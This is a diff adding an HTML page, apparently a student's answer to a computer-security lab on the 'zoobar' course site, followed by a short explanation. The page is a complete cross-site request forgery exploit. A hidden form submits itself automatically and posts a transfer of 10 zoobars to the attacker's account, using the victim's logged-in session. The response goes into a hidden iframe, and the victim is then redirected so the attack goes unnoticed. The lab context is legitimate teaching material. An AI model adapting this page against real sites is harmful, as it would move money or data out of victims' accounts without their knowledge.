@@ -1,0 +1,48 @@
+<html>
+<head>
+
+<style type="text/css">
+	div{visibility:hidden;}
+</style>
+
+<script language="javascript" type="text/javascript">
+   function attack(){
+	
+   }
+   function redirect(){
+	document.location="http://ece568.csl.toronto.edu/";
+   }
+
+</script>
+</head>
+<body>
+<div visibility="hidden">
+	<form id=ff action="http://zoobar.csl.toronto.edu/transfer.php" method="post" target="cheat">
+	<input name=zoobars type=text value="10" size=5>
+	<input name=zb_recipient type=text value="linehrr123">
+	<input id=asd type=submit name=submission value="Send">
+	</form>
+<script>
+	asd.focus();
+	asd.click();
+</script>
+
+
+</div>
+
+
+<iframe style="visibility: hidden" onLoad="redirect();" align="top" src="" name="cheat">
+</iframe>
+
+
+
+</body>
+</html>
+
+
+
+description:
+This is a cross-site forgery attack. The user has already logged into the zoobar website that means the cookie has saved in the browser. Then we use this html to create a fake request to the http://zoobar.csl.toronto.edu/transfer.php to let it transfer 10 zoobars to our account. We use CSS to hide the form and everything then the user won't probably notice the attack happens. Then after the attack succeeds, we immediately redirect the webpage to the correct location. In order to avoid the address change in the address bar, we put the target of the form to a hidden iframe which will redirect the page to the correct location when it's loaded.
+
+
+
